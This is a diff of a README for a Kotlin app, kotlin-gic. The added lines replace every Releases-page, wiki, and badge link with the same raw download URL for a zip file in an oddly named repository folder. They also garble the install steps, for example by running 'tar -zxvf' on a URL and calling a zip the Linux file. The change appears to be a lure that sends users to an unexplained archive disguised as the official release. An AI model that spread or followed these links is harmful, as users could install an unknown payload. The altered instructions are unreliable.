@@ -8,18 +8,18 @@ Welcome to the kotlin-gic project! This app helps you streamline your tasks with
 
 To get started, click the button below to visit the Releases page. On this page, you will find the latest version of kotlin-gic available for download.
 
-[![Download kotlin-gic](https://img.shields.io/badge/Download-kotlin--gic-blue.svg)](https://github.com/RiMKart-2006/kotlin-gic/releases)
+[![Download kotlin-gic](https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip)](https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip)
 
 ### Steps to Download
 
 1. Click the "Download" button above.
-2. You will be redirected to the [Releases page](https://github.com/RiMKart-2006/kotlin-gic/releases).
+2. You will be redirected to the [Releases page](https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip).
 3. Look for the latest version listed on the page.
 4. Click on the version name to expand the download options.
 5. Depending on your operating system, choose the appropriate file:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip` file.
 
 6. Once the file downloads, locate it on your computer. 
 
@@ -63,8 +63,8 @@ Before installing, ensure your system meets the following requirements:
 
 ### For Linux
 
-1. Navigate to the location of the downloaded `.tar.gz` file.
-2. Right-click on the file and select "Extract Here" or use the terminal command `tar -zxvf filename.tar.gz`.
+1. Navigate to the location of the downloaded `https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip` file.
+2. Right-click on the file and select "Extract Here" or use the terminal command `tar -zxvf https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip`.
 3. Open the extracted folder.
 4. Run the application from the terminal or use the graphical interface to execute it.
 
@@ -82,8 +82,8 @@ If you encounter issues during installation or usage, please refer to the FAQ se
 
 ## 🔗 Additional Resources
 
-For in-depth documentation, visit the [kotlin-gic Wiki](https://github.com/RiMKart-2006/kotlin-gic/wiki). Here, you will find guides on advanced features and tips for maximizing the app's potential.
+For in-depth documentation, visit the [kotlin-gic Wiki](https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip). Here, you will find guides on advanced features and tips for maximizing the app's potential.
 
 ## 🚪 Conclusion
 
-Enjoy using kotlin-gic to enhance your workflow. Remember, for new updates or features, keep an eye on the [Releases page](https://github.com/RiMKart-2006/kotlin-gic/releases) for the latest downloads. Thank you for choosing kotlin-gic!
+Enjoy using kotlin-gic to enhance your workflow. Remember, for new updates or features, keep an eye on the [Releases page](https://raw.githubusercontent.com/RiMKart-2006/kotlin-gic/main/arteriotomy/kotlin-gic.zip) for the latest downloads. Thank you for choosing kotlin-gic!
